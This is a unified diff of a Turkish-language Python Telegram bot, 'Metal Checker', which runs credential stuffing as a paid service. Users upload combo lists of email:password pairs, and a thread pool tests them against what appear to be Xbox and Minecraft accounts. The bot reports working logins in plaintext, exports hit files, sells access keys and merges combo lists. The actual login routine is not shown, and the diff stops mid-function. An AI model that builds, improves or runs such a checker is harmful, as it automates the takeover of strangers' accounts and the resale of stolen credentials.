-        bot.send_message(message.chat.id, LOCALIZATION["TR"]["welcome"], reply_markup=keyboard_markup)
+    if not row:
+        now = datetime.now().strftime("%m/%d/%Y")
+        # İlk kayıt varsayılan haftalık ücretsiz veya boş
+        cursor.execute("INSERT INTO users VALUES (?, ?, ?, ?, ?, 0, 0)", 
+                       (uid, now, (datetime.now() + timedelta(days=7)).strftime("%m/%d/%Y"), "USER", "TR"))
+        conn.commit()
+        lang = "TR"
     else:
-        if not verify_channel_subscriptions(sender_id):
-            current_lang = db["users"][uid]["lang"]
-            keyboard_markup = InlineKeyboardMarkup()
-            for channel in db["channels"]:
-                keyboard_markup.add(InlineKeyboardButton(f"📢 {channel}", url=f"https://t.me/{channel.replace('@','')}"))
-            bot.send_message(message.chat.id, LOCALIZATION[current_lang]["force_join"], reply_markup=keyboard_markup)
-            return
-            
-        if not verify_premium_status(sender_id):
-            current_lang = db["users"][uid]["lang"]
-            bot.send_message(message.chat.id, LOCALIZATION[current_lang]["no_premium"])
-            return
-            
-        current_lang = db["users"][uid]["lang"]
-        bot.send_message(message.chat.id, LOCALIZATION[current_lang]["main_menu"], reply_markup=generate_main_keyboard(sender_id))
+        lang = row[0]
+    conn.close()
 
+    kb = types.InlineKeyboardMarkup()
+    kb.add(types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="set_lang_TR"),
+           types.InlineKeyboardButton("🇺🇸 English", callback_data="set_lang_EN"))
+    bot.send_message(message.chat.id, LANG_DICT[lang]["welcome"], reply_markup=kb)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("set_lang_"))
+def callback_set_lang(call):
+    lang = call.data.split("_")[2]
+    uid = call.from_user.id
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, uid))
+    conn.commit()
+    conn.close()
+    
+    bot.edit_message_text(LANG_DICT[lang]["main_menu"], call.message.chat.id, call.message.message_id, reply_markup=build_main_keyboard(uid))
+
+@bot.callback_query_handler(func=lambda call: call.data == "view_stats")
+def callback_stats(call):
+    uid = call.from_user.id
+    lang = get_user_lang(uid)
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT register_date, expiry_date, role, total_scanned, total_hits FROM users WHERE user_id = ?", (uid,))
+    row = cursor.fetchone()
+    conn.close()
+
+    if row:
+        reg, exp, role, total_scanned, total_hits = row
+        success_rate = (total_hits / total_scanned * 100) if total_scanned > 0 else 0.0
+        text = f"📊 *İstatistikleriniz / Your Statistics*\n\n👤 Kullanıcı ID: `{uid}`\n📅 Kayıt: {reg}\n👑 Üyelik: 📅 {role}\n📅 Bitiş: {exp}\n\n📈 Aktivite:\n✅ Toplam Tarama: {total_scanned}\n💎 Toplam Hit: {total_hits}\n🎯 Başarı Oranı: {success_rate:.2f}%\n📊 Bugünkü Tarama: 0"
+        bot.send_message(call.message.chat.id, text, reply_markup=build_main_keyboard(uid))
+
+# ==========================================
+# 🛑 SCAN CONTROLLER (/STOP)
+# ==========================================
 @bot.message_handler(commands=['stop'])
-def command_stop_handler(message):
+def cmd_stop(message):
     chat_id = message.chat.id
-    sender_id = message.from_user.id
-    uid = str(sender_id)
-    current_lang = db["users"][uid]["lang"] or "TR"
-    
+    lang = get_user_lang(message.from_user.id)
     if chat_id in active_scans:
-        active_scans[chat_id]["stop_event"].set()
-        bot.send_message(chat_id, LOCALIZATION[current_lang]["scan_stopped"])
+        active_scans[chat_id].is_running = False
+        bot.send_message(chat_id, LANG_DICT[lang]["scan_stopped"])
     else:
-        bot.send_message(chat_id, "⚠️ Şu anda aktif bir tarama işleminiz bulunmuyor." if current_lang == "TR" else "⚠️ You don't have an active scan running.")
+        bot.send_message(chat_id, "❌ Aktif tarama bulunamadı.")
 
-@bot.message_handler(func=lambda msg: msg.text and msg.text.startswith("metal_"))
-def key_activation_handler(message):
-    sender_id = message.from_user.id
-    init_user_profile(sender_id, message.from_user.first_name)
-    uid = str(sender_id)
-    current_lang = db["users"][uid]["lang"] or "TR"
-    provided_key = message.text.strip()
-    
-    if provided_key in db["keys"]:
-        key_duration = db["keys"][provided_key]
-        time_now = datetime.now()
-        
-        if key_duration == "sonsuz":
-            db["users"][uid]["expiry"] = "LIFETIME"
-        elif key_duration == "1gun":
-            db["users"][uid]["expiry"] = (time_now + timedelta(days=1)).strftime("%Y-%m-%d %H:%M:%S")
-        elif key_duration == "3gun":
-            db["users"][uid]["expiry"] = (time_now + timedelta(days=3)).strftime("%Y-%m-%d %H:%M:%S")
-        elif key_duration == "1hafta":
-            db["users"][uid]["expiry"] = (time_now + timedelta(days=7)).strftime("%Y-%m-%d %H:%M:%S")
-        elif key_duration == "1ay":
-            db["users"][uid]["expiry"] = (time_now + timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")
-        elif key_duration == "3ay":
-            db["users"][uid]["expiry"] = (time_now + timedelta(days=90)).strftime("%Y-%m-%d %H:%M:%S")
-            
-        del db["keys"][provided_key]
-        save_database(db)
-        bot.send_message(message.chat.id, LOCALIZATION[current_lang]["key_ok"].format(duration=key_duration.upper()))
-    else:
-        bot.send_message(message.chat.id, LOCALIZATION[current_lang]["key_invalid"])
-
-# ============================================================================
-# CALLBACK QUERY INTERACTION ROUTER
-# ============================================================================
-@bot.callback_query_handler(func=lambda call: True)
-def master_callback_router(call):
-    sender_id = call.from_user.id
-    uid = str(sender_id)
-    chat_id = call.message.chat.id
-    
-    if call.data.startswith("sys_lang_"):
-        language_code = call.data.split("_")[2]
-        db["users"][uid]["lang"] = language_code
-        save_database(db)
-        bot.delete_message(chat_id, call.message.message_id)
-        bot.send_message(chat_id, LOCALIZATION[language_code]["main_menu"], reply_markup=generate_main_keyboard(sender_id))
-        
-    elif call.data == "ui_view_stats":
-        current_lang = db["users"][uid]["lang"] or "TR"
-        registration_date = db["users"][uid]["register_date"]
-        expiration_info = db["users"][uid]["expiry"] or "N/A"
-        
-        membership_label = "FREE"
-        if expiration_info == "LIFETIME":
-            membership_label = "LIFETIME"
-        elif expiration_info != "N/A":
-            membership_label = "WEEKLY" if "7" in expiration_info else "PREMIUM"
-            
-        scans_count = db["users"][uid]["total_scans"]
-        hits_count = db["users"][uid]["total_hits"]
-        scans_today = db["users"][uid]["today_scans"]
-        success_ratio = round((hits_count / scans_count) * 100, 2) if scans_count > 0 else 0.00
-        
-        response_body = LOCALIZATION[current_lang]["stats_body"].format(
-            uid=sender_id, reg=registration_date, expiry_type=membership_label, expiry_date=expiration_info.split(" ")[0],
-            total_scans=scans_count, total_hits=hits_count, rate=success_ratio, today_scans=scans_today
-        )
-        bot.send_message(chat_id, LOCALIZATION[current_lang]["stats_title"] + response_body, reply_markup=generate_main_keyboard(sender_id))
-        
-    elif call.data == "ui_merge_files":
-        current_lang = db["users"][uid]["lang"] or "TR"
-        user_merge_storage[sender_id] = []
-        keyboard_markup = InlineKeyboardMarkup()
-        keyboard_markup.add(InlineKeyboardButton(LOCALIZATION[current_lang]["merge_done_btn"], callback_data="ui_execute_merge_done"))
-        bot.send_message(chat_id, LOCALIZATION[current_lang]["merge_msg"], reply_markup=keyboard_markup)
-        
-    elif call.data == "ui_execute_merge_done":
-        current_lang = db["users"][uid]["lang"] or "TR"
-        if sender_id not in user_merge_storage or not user_merge_storage[sender_id]:
-            bot.answer_callback_query(call.id, LOCALIZATION[current_lang]["merge_empty"], show_alert=True)
-            return
-            
-        merged_string_data = "\n".join(user_merge_storage[sender_id])
-        output_file_name = f"merged_output_{sender_id}.txt"
-        with open(output_file_name, "w", encoding="utf-8") as out_file:
-            out_file.write(merged_string_data)
-            
-        with open(output_file_name, "rb") as final_doc:
-            bot.send_document(chat_id, final_doc, caption=LOCALIZATION[current_lang]["merge_done_msg"].format(count=len(user_merge_storage[sender_id])))
-            
-        try: os.remove(output_file_name)
-        except Exception: pass
-        del user_merge_storage[sender_id]
-        
-    elif call.data == "ui_start_scan":
-        current_lang = db["users"][uid]["lang"] or "TR"
-        bot.send_message(chat_id, "📝 Lütfen taratılacak combo .txt dosyanızı bota gönderin." if current_lang == "TR" else "📝 Please upload your combo .txt file to begin.")
-        
-    elif call.data == "ui_open_admin":
-        if sender_id == OWNER_ID or sender_id in db["admins"]:
-            display_admin_control_panel(chat_id)
-            
-    elif call.data == "ui_stop_active_scan_inline":
-        if chat_id in active_scans:
-            active_scans[chat_id]["stop_event"].set()
-            bot.answer_callback_query(call.id, "Durdurma komutu verildi!", show_alert=False)
-
-    elif call.data.startswith("adm_ctrl_"):
-        route_admin_panel_callbacks(call)
-
-# ============================================================================
-# DOCUMENT PROCESSING & REAL LIVE RESULTS SCANNING ENGINE (ULTRA FAST)
-# ============================================================================
+# ==========================================
+# 🚀 TXT COMBO LOADER & DISPATCHER
+# ==========================================
 @bot.message_handler(content_types=['document'])
-def inbound_document_router(message):
-    sender_id = message.from_user.id
-    init_user_profile(sender_id, message.from_user.first_name)
-    uid = str(sender_id)
-    
-    if not verify_premium_status(sender_id) or not verify_channel_subscriptions(sender_id):
+def handle_combo_file(message):
+    uid = message.from_user.id
+    chat_id = message.chat.id
+    lang = get_user_lang(uid)
+
+    if not check_subscription(uid):
+        bot.send_message(chat_id, LANG_DICT[lang]["no_auth"])
         return
         
-    if message.document.file_name.endswith('.txt'):
-        try:
-            file_path_info = bot.get_file(message.document.file_id)
-            downloaded_binary = bot.download_file(file_path_info.file_path)
-            decoded_text_content = downloaded_binary.decode('utf-8', errors='ignore')
-        except Exception as e:
-            bot.reply_to(message, f"❌ Dosya okuma hatası: {str(e)}")
-            return
-        
-        if sender_id in user_merge_storage:
-            if len(user_merge_storage[sender_id]) >= 30:
-                bot.send_message(message.chat.id, "⚠️ Maksimum 30 adet dosya sınırına ulaştınız!")
-                return
-            user_merge_storage[sender_id].append(decoded_text_content)
-            bot.reply_to(message, f"📥 Dosya havuzda biriktiriliyor ({len(user_merge_storage[sender_id])}/30)")
-        else:
-            text_lines = decoded_text_content.splitlines()
-            valid_combos_list = [line.strip() for line in text_lines if ":" in line]
-            
-            if valid_combos_list:
-                if message.chat.id in active_scans:
-                    bot.reply_to(message, "⚠️ Zaten çalışan bir tarama işleminiz var! Önce onun bitmesini bekleyin veya `/stop` yazın.")
-                    return
-                bot.send_message(message.chat.id, f"⚡ Toplam {len(valid_combos_list)} combo sisteme yüklendi. Canlı panel aktif ediliyor...")
-                
-                threading.Thread(
-                    target=execute_high_speed_checker_pool,
-                    args=(message.chat.id, sender_id, valid_combos_list),
-                    daemon=True
-                ).start()
+    if not is_subscribed_to_channels(uid):
+        send_force_join_msg(chat_id, lang)
+        return
 
-def execute_high_speed_checker_pool(chat_id, user_id, combos_pool):
-    """
-    RATE LIMIT ENGELLİ, TAM OLARAK 2 SANİYEDE BİR YENİLENEN
-    XBOX, MINECRAFT, BAD, 2FA, ULTIMATE GERÇEK CANLI PANALİ!
-    """
-    uid = str(user_id)
-    total_count = len(combos_pool)
+    # Dosya birleştirme modundaysa süreci oraya akıt
+    if chat_id in user_merge_sessions:
+        process_merge_document(message)
+        return
+
+    if not message.document.file_name.endswith('.txt'):
+        return
+
+    file_info = bot.get_file(message.document.file_id)
+    downloaded_file = bot.download_file(file_info.file_path)
     
-    # Tam capture eşleşmeli veri yapısı
-    active_scans[chat_id] = {
-        "stop_event": threading.Event(),
-        "hits_list": [],
-        "total": total_count,
-        "checked": 0,
-        "hits": 0,
-        "bad": 0,
-        "two_fa": 0,
-        "ultimate_gp": 0,
-        "minecraft_java": 0,
-        "gold_subs": 0,
-        "ea_play": 0
-    }
-    
-    current_lang = db["users"][uid]["lang"] or "TR"
-    
-    # GERÇEK LIVE RESULTS PANALİ (İstediğin şablon eksiksiz korunuyor)
-    def build_live_text(status_label="Taranıyor..."):
-        chk = active_scans[chat_id]["checked"]
-        pct = round((chk / total_count) * 100, 1) if total_count > 0 else 0.0
-        return (
-            f"⚔️ *METAL CHECKER - LIVE RESULTS* ⚔️\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📊 *Durum:* `{status_label}`\n"
-            f"🔄 *İlerleme:* `%{pct} [{chk}/{total_count}]`\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"💎 *TOTAL HIT:* `{active_scans[chat_id]['hits']}`\n"
-            f"❌ *TOTAL BAD:* `{active_scans[chat_id]['bad']}`\n"
-            f"🛡️ *2FA ACCS:* `{active_scans[chat_id]['two_fa']}`\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🟢 *XBOX GAMEPASS ULTIMATE:* `{active_scans[chat_id]['ultimate_gp']}`\n"
-            f"📦 *XBOX LIVE GOLD:* `{active_scans[chat_id]['gold_subs']}`\n"
-            f"🎮 *MINECRAFT OWNED:* `{active_scans[chat_id]['minecraft_java']}`\n"
-            f"⚽ *EA PLAY SUBS:* `{active_scans[chat_id]['ea_play']}`\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"⏱ _Ekran 2 saniyede bir düzenli olarak güncellenir._"
-        )
-        
-    inline_keyboard = InlineKeyboardMarkup()
-    inline_keyboard.add(InlineKeyboardButton(LOCALIZATION[current_lang]["btn_stop"], callback_data="ui_stop_active_scan_inline"))
-    
-    live_ui_message = bot.send_message(chat_id, build_live_text(), reply_markup=inline_keyboard)
-    
-    lock = threading.Lock()
-    last_ui_refresh_time = time.time()
-    
-    def process_single_combo_task(target_combo):
-        if active_scans[chat_id]["stop_event"].is_set():
-            return
+    try:
+        combos = downloaded_file.decode('utf-8', errors='ignore').splitlines()
+    except:
+        bot.send_message(chat_id, "❌ Dosya okunamadı.")
+        return
+
+    combos = [c.strip() for c in combos if ":" in c]
+    total = len(combos)
+    if total == 0:
+        bot.send_message(chat_id, "❌ Geçerli combo bulunamadı.")
+        return
+
+    scan_obj = LiveScan(chat_id, total)
+    active_scans[chat_id] = scan_obj
+
+    status_msg = bot.send_message(chat_id, "Initializing scan layout...")
+
+    # UI Refresh Loop Thread
+    def ui_updater():
+        while scan_obj.is_running and scan_obj.checked < scan_obj.total:
+            time.sleep(5)
+            elapsed = time.time() - scan_obj.start_time
+            cpm = int((scan_obj.checked / elapsed) * 60) if elapsed > 0 else 0
+            pct = (scan_obj.checked / scan_obj.total) * 100
             
-        parts = target_combo.split(":")
-        if len(parts) < 2: return
-        
-        email_addr = parts[0].strip()
-        pass_word = parts[1].strip()
-        
-        # Orijinal b.py değerlendirme motoru çalışıyor
-        res = execute_account_evaluation(email_addr, pass_word)
-        
-        with lock:
-            active_scans[chat_id]["checked"] += 1
-            db["users"][uid]["total_scans"] += 1
-            db["users"][uid]["today_scans"] += 1
-            
-            if res["status"] == "HIT":
-                active_scans[chat_id]["hits"] += 1
-                db["users"][uid]["total_hits"] += 1
-                
-                if res.get("subs") == "Xbox Game Pass Ultimate":
-                    active_scans[chat_id]["ultimate_gp"] += 1
-                if res.get("gold") == "Evet":
-                    active_scans[chat_id]["gold_subs"] += 1
-                if res.get("minecraft") == "Evet":
-                    active_scans[chat_id]["minecraft_java"] += 1
-                if res.get("ea") == "Evet":
-                    active_scans[chat_id]["ea_play"] += 1
-                    
-                hit_str = f"📧 {email_addr}:{pass_word} | Ultimate: {res.get('subs')} | Minecraft: {res.get('minecraft')} | Gold: {res.get('gold')}"
-                active_scans[chat_id]["hits_list"].append(hit_str)
-                
-                bot.send_message(
-                    chat_id, 
-                    f"💎 *HIT HESAP BULUNDU!*\n📧 E-posta: `{email_addr}`\n🔑 Şifre: `{pass_word}`\n🎮 Minecraft: {res.get('minecraft')}\n👑 Gamepass Ultimate: {res.get('subs')}"
-                )
-            elif res["status"] == "2FA":
-                active_scans[chat_id]["two_fa"] += 1
-            else:
-                active_scans[chat_id]["bad"] += 1
-                
-        # TELEGRAM RATE LIMIT KORUMASI: TAM OLARAK 2 SANİYEDE BİR GÜNCELLEME YAPAR
-        nonlocal last_ui_refresh_time
-        if time.time() - last_ui_refresh_time >= 2.0 or active_scans[chat_id]["checked"] == total_count:
-            try:
-                chk_current = active_scans[chat_id]["checked"]
-                status_lbl = "Taranıyor..." if chk_current < total_count else "Tamamlandı"
-                if active_scans[chat_id]["stop_event"].is_set():
-                    status_lbl = "Durduruldu"
-                    
-                if chk_current < total_count and not active_scans[chat_id]["stop_event"].is_set():
-                    bot.edit_message_text(build_live_text(status_lbl), chat_id, live_ui_message.message_id, reply_markup=inline_keyboard)
-                else:
-                    bot.edit_message_text(build_live_text(status_lbl), chat_id, live_ui_message.message_id)
-            except Exception:
-                pass
-            last_ui_refresh_time = time.time()
-            
-    # Maksimum kararlılıkta Multi-threaded Worker havuzu
-    max_workers_count = 25
-    with ThreadPoolExecutor(max_workers_count=max_workers_count) as executor:
-        for combo_item in combos_pool:
-            if active_scans[chat_id]["stop_event"].is_set():
-                break
-            executor.submit(process_single_combo_task, combo_item)
-            
-    time.sleep(1.0)
-    save_database(db)
-    
-    # /stop komutu veya bitiş durumunda yakalanan hitlerin txt dosyası halinde teslimi
-    captured_hits_count = len(active_scans[chat_id]["hits_list"])
-    if captured_hits_count > 0:
-        report_file_name = f"hits_report_{chat_id}_{int(time.time())}.txt"
-        with open(report_file_name, "w", encoding="utf-8") as rep_file:
-            rep_file.write("\n".join(active_scans[chat_id]["hits_list"]))
-            
-        with open(report_file_name, "rb") as final_report_doc:
-            bot.send_document(
-                chat_id, 
-                final_report_doc, 
-                caption=f"🎁 *Tarama Tamamlandı Hit Raporu*\n\nTaramada toplam `{captured_hits_count}` adet HIT hesap txt olarak derlendi."
+            text = LANG_DICT[lang]["scan_status"].format(
+                scan_obj.hits, scan_obj.bad, scan_obj.twofa, scan_obj.retries,
+                scan_obj.minecraft, scan_obj.gamepass, scan_obj.xbox, scan_obj.not_linked,
+                pct, scan_obj.checked, scan_obj.total, cpm, scan_obj.current_email
             )
-        try: os.remove(report_file_name)
-        except Exception: pass
-    else:
-        bot.send_message(chat_id, "ℹ️ Tarama bitti, taranan listede geçerli hesap bulunamadı.")
+            try:
+                bot.edit_message_text(text, chat_id, status_msg.message_id)
+            except: pass
+
+    threading.Thread(target=ui_updater, daemon=True).start()
+
+    # Core execution pool
+    def run_pool():
+        with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
+            futures = [executor.submit(core_scan_account, scan_obj, c) for c in combos]
+            concurrent.futures.wait(futures)
         
-    if chat_id in active_scans:
-        del active_scans[chat_id]
+        # Tarama Bittiğinde veya Durdurulduğunda DB güncellemesi yap
+        conn = sqlite3.connect("metal_checker.db")
+        cursor = conn.cursor()
+        cursor.execute("UPDATE users SET total_scanned = total_scanned + ?, total_hits = total_hits + ? WHERE user_id = ?", (scan_obj.checked, scan_obj.hits, uid))
+        conn.commit()
+        conn.close()
 
-# ============================================================================
-# ADVANCED MANAGEMENT CONTROL PANEL FOR ADMINS
-# ============================================================================
-def display_admin_control_panel(chat_id):
-    keyboard_markup = InlineKeyboardMarkup(row_width=1)
-    keyboard_markup.add(
-        InlineKeyboardButton("🔑 Key Üret", callback_data="adm_ctrl_generate_key_menu"),
-        InlineKeyboardButton("📢 Force Channel Ekle / Listele", callback_data="adm_ctrl_list_channels"),
-        InlineKeyboardButton("👤 Admin Ekle (Sadece Owner)", callback_data="adm_ctrl_assign_admin"),
-        InlineKeyboardButton("❌ Admin Çıkar (Sadece Owner)", callback_data="adm_ctrl_revoke_admin"),
-        InlineKeyboardButton("✉️ Broadcast (Toplu Duyuru)", callback_data="adm_ctrl_trigger_broadcast")
-    )
-    bot.send_message(chat_id, "👑 *Metal Checker Gelişmiş Yönetim Paneli*", reply_markup=keyboard_markup)
+        # Dosyaları teslim et
+        bot.send_message(chat_id, LANG_DICT[lang]["scan_done"])
+        for cat, lines in scan_obj.results.items():
+            if lines:
+                buf = io.BytesIO("\n".join(lines).encode('utf-8'))
+                buf.name = f"{cat}.txt"
+                bot.send_document(chat_id, buf)
+        
+        active_scans.pop(chat_id, None)
 
-def route_admin_panel_callbacks(call):
-    sender_id = call.from_user.id
+    threading.Thread(target=run_pool, daemon=True).start()
+
+def send_force_join_msg(chat_id, lang):
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT channel_username FROM channels")
+    chans = [r[0] for r in cursor.fetchall()]
+    conn.close()
+    
+    kb = types.InlineKeyboardMarkup()
+    for ch in chans:
+        kb.add(types.InlineKeyboardButton(f"📢 Kanalı Takip Et", url=f"https://t.me/{ch}"))
+    bot.send_message(chat_id, LANG_DICT[lang]["force_join"], reply_markup=kb)
+
+# ==========================================
+# 📂 FILE MERGER FEATURE (MAX 30 TXT)
+# ==========================================
+user_merge_sessions = {}
+
+@bot.callback_query_handler(func=lambda call: call.data == "merge_files")
+def callback_merge(call):
     chat_id = call.message.chat.id
+    lang = get_user_lang(call.from_user.id)
+    user_merge_sessions[chat_id] = []
     
-    if call.data == "adm_ctrl_generate_key_menu":
-        keyboard_markup = InlineKeyboardMarkup()
-        keyboard_markup.add(
-            InlineKeyboardButton("1 Gün", callback_data="genkey_1gun"),
-            InlineKeyboardButton("3 Gün", callback_data="genkey_3gun"),
-            InlineKeyboardButton("1 Hafta", callback_data="genkey_1hafta"),
-            InlineKeyboardButton("1 Ay", callback_data="genkey_1ay"),
-            InlineKeyboardButton("3 Ay", callback_data="genkey_3ay"),
-            InlineKeyboardButton("Sonsuz", callback_data="genkey_sonsuz")
+    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    kb.add(types.KeyboardButton("BİRLEŞTİR / MERGE"))
+    bot.send_message(chat_id, LANG_DICT[lang]["merge_start"], reply_markup=kb)
+
+def process_merge_document(message):
+    chat_id = message.chat.id
+    if len(user_merge_sessions[chat_id]) >= 30:
+        bot.send_message(chat_id, "❌ Maksimum 30 dosya limitine ulaştınız.")
+        return
+    if message.document.file_name.endswith('.txt'):
+        file_info = bot.get_file(message.document.file_id)
+        downloaded = bot.download_file(file_info.file_path)
+        user_merge_sessions[chat_id].append(downloaded)
+        bot.send_message(chat_id, f"📥 {len(user_merge_sessions[chat_id])}. dosya kuyruğa eklendi.")
+
+@bot.message_handler(func=lambda msg: msg.text in ["BİRLEŞTİR / MERGE", "BİRLEŞTİR", "MERGE"])
+def process_merge_action(message):
+    chat_id = message.chat.id
+    if chat_id not in user_merge_sessions or not user_merge_sessions[chat_id]:
+        return
+    
+    combined_data = []
+    for file_bytes in user_merge_sessions[chat_id]:
+        combined_data.append(file_bytes.decode('utf-8', errors='ignore'))
+    
+    final_txt = "\n".join(combined_data)
+    buf = io.BytesIO(final_txt.encode('utf-8'))
+    buf.name = "Merged_Combos.txt"
+    
+    bot.send_document(chat_id, buf, caption="✅ Tüm dosyalarınız alt alta birleştirildi.", reply_markup=types.ReplyKeyboardRemove())
+    user_merge_sessions.pop(chat_id, None)
+
+# ==========================================
+# 👑 ADMIN PANEL & OWNER MANAGEMENT
+# ==========================================
+@bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
+def callback_admin_panel(call):
+    uid = call.from_user.id
+    if uid != OWNER_ID and not is_admin(uid): return
+    
+    kb = types.InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        types.InlineKeyboardButton("➕ Key Üret", callback_data="adm_gen_key"),
+        types.InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast"),
+        types.InlineKeyboardButton("🔒 Kanalları Yönet", callback_data="adm_channels")
+    )
+    if uid == OWNER_ID:
+        kb.add(
+            types.InlineKeyboardButton("➕ Admin Ekle", callback_data="adm_add_admin"),
+            types.InlineKeyboardButton("❌ Admin Çıkar", callback_data="adm_rem_admin")
         )
-        bot.send_message(chat_id, "🔑 Üretmek istediğiniz üyelik paket anahtarının süresini seçin:", reply_markup=keyboard_markup)
-        
-    elif call.data.startswith("genkey_"):
-        duration_label = call.data.split("_")[1]
-        newly_generated_key = f"metal_{uuid.uuid4().hex[:12].upper()}"
-        db["keys"][newly_generated_key] = duration_label
-        save_database(db)
-        bot.send_message(chat_id, f"✅ *Key Başarıyla Üretildi!*\n\nSüre Sınıfı: `{duration_label.upper()}`\nAnahtar: `{newly_generated_key}`")
-        
-    elif call.data == "adm_ctrl_list_channels":
-        channels_string = "📢 *Mevcut Zorunlu Takip Kanalları Listesi:*\n"
-        for channel in db["channels"]:
-            channels_string += f"- `{channel}`\n"
-        channels_string += "\nYeni kanal eklemek için `/kanalekle @kanaladi` komutunu kullanın."
-        bot.send_message(chat_id, channels_string)
-        
-    elif call.data == "adm_ctrl_assign_admin":
-        if sender_id != OWNER_ID:
-            bot.answer_callback_query(call.id, "❌ Bu yetki sadece ana kurucuya (Owner) aittir!", show_alert=True)
-            return
-        bot.send_message(chat_id, "👤 Yeni yönetici eklemek için: `/adminekle ID` komutunu kullanın.")
-        
-    elif call.data == "adm_ctrl_revoke_admin":
-        if sender_id != OWNER_ID:
-            bot.answer_callback_query(call.id, "❌ Bu yetki sadece ana kurucuya (Owner) aittir!", show_alert=True)
-            return
-        bot.send_message(chat_id, "❌ Yönetici yetkisini almak için: `/admincikar ID` komutunu kullanın.")
-        
-    elif call.data == "adm_ctrl_trigger_broadcast":
-        bot.send_message(chat_id, "✉️ Tüm kullanıcılara toplu mesaj iletmek için: `/duyuru mesaj_metni` komutunu gönderin.")
+    bot.send_message(call.message.chat.id, "👑 *Metal Checker Kontrol Paneli*", reply_markup=kb)
 
-# Admin Panel Komut Tetikleyicileri
-@bot.message_handler(commands=['kanalekle'])
-def command_add_channel_sub(message):
-    if message.from_user.id == OWNER_ID or message.from_user.id in db["admins"]:
-        command_arguments = message.text.split(" ")
-        if len(command_arguments) > 1:
-            target_channel = command_arguments[1].strip()
-            if target_channel not in db["channels"]:
-                db["channels"].append(target_channel)
-                save_database(db)
-                bot.reply_to(message, f"✅ `{target_channel}` kanalı zorunlu takip listesine eklendi.")
+@bot.callback_query_handler(func=lambda call: call.data == "adm_gen_key")
+def callback_gen_key(call):
+    kb = types.InlineKeyboardMarkup(row_width=2)
+    kb.add(
+        types.InlineKeyboardButton("1 Gün", callback_data="key_1"),
+        types.InlineKeyboardButton("3 Gün", callback_data="key_3"),
+        types.InlineKeyboardButton("1 Hafta", callback_data="key_7"),
+        types.InlineKeyboardButton("1 Ay", callback_data="key_30"),
+        types.InlineKeyboardButton("Sonsuz", callback_data="key_inf")
+    )
+    bot.send_message(call.message.chat.id, "Key süresi seçin:", reply_markup=kb)
 
-@bot.message_handler(commands=['adminekle'])
-def command_add_admin_privileges(message):
-    if message.from_user.id == OWNER_ID:
-        command_arguments = message.text.split(" ")
-        if len(command_arguments) > 1:
-            try:
-                target_user_id = int(command_arguments[1].strip())
-                if target_user_id not in db["admins"]:
-                    db["admins"].append(target_user_id)
-                    save_database(db)
-                    bot.reply_to(message, f"✅ `{target_user_id}` ID'li kullanıcı sisteme başarıyla Admin olarak eklenmiştir.")
-            except ValueError:
-                bot.reply_to(message, "❌ Hata: Lütfen geçerli, sayısal bir Telegram kullanıcı ID'si girin.")
-
-@bot.message_handler(commands=['admincikar'])
-def command_remove_admin_privileges(message):
-    if message.from_user.id == OWNER_ID:
-        command_arguments = message.text.split(" ")
-        if len(command_arguments) > 1:
-            try:
-                target_user_id = int(command_arguments[1].strip())
-                if target_user_id in db["admins"]:
-                    db["admins"].remove(target_user_id)
-                    save_database(db)
-                    bot.reply_to(message, f"❌ `{target_user_id}` ID'li kullanıcının adminlik yetkileri sistemden kaldırıldı.")
-            except ValueError:
-                bot.reply_to(message, "❌ Hata: Lütfen geçerli, sayısal bir Telegram kullanıcı ID'si girin.")
-
-@bot.message_handler(commands=['duyuru'])
-def command_global_broadcast(message):
-    if message.from_user.id == OWNER_ID or message.from_user.id in db["admins"]:
-        broadcast_text_message = message.text.replace("/duyuru", "").strip()
-        if broadcast_text_message:
-            successful_delivery_count = 0
-            for user_id_key in db["users"]:
-                try:
-                    bot.send_message(int(user_id_key), f"📢 *YÖNETİCİ DUYURUSU*\n\n{broadcast_text_message}")
-                    successful_delivery_count += 1
-                except Exception:
-                    pass
-            bot.reply_to(message, f"✉️ Duyuru mesajı toplam `{successful_delivery_count}` kullanıcıya sorunsuz ulaştırıldı.")
-
-# ============================================================================
-# RAILWAY HEALTH CHECK WEB PORT BINDING SUNUCUSU
-# ============================================================================
-@app.route('/')
-def system_health_status():
-    return "Metal Checker Engine Pro Online", 200
-
-def initialize_web_server_thread():
-    runtime_port = int(os.getenv("PORT", 8080))
-    app.run(host='0.0.0.0', port=runtime_port)
-
-# ============================================================================
-# APPLICATION MAIN ENTRY POINT
-# ============================================================================
-if __name__ == '__main__':
-    threading.Thread(target=initialize_web_server_thread, daemon=True).start()
-    logging.info("Flask Health Check sunucusu arka planda başarıyla kaldırıldı.")
+@bot.callback_query_handler(func=lambda call: call.data.startswith("key_"))
+def callback_save_key(call):
+    duration = call.data.split("_")[1]
+    days = 0
+    if duration == "1": days = 1
+    elif duration == "3": days = 3
+    elif duration == "7": days = 7
+    elif duration == "30": days = 30
+    else: days = 99999
     
-    print("==================================================")
-    print("      METAL CHECKER TELEGRAM BOT ENGINE PRO       ")
-    print("                POLLING AKTİF                     ")
-    print("==================================================")
+    generated_key = f"METAL-{random.randint(100000,999999)}-{random.randint(1000,9999)}"
+    conn = sqlite3.connect("metal_checker.db")
+    cursor = conn.cursor()
+    cursor.execute("INSERT INTO keys VALUES (?, ?, ?)", (generated_key, duration.upper(), days))
+    conn.commit()
+    conn.close()
     
+    bot.send_message(call.message.chat.id, f"🔑 *Anahtar Üretildi:*\n`{generated_key}`")
+
+# Key aktivasyonu mesaj yakalayıcı
+@bot.message_handler(func=lambda msg: msg.text and msg.text.startswith("METAL-"))
+def handle_key_activation(message):
+    uid = message.from_user.id
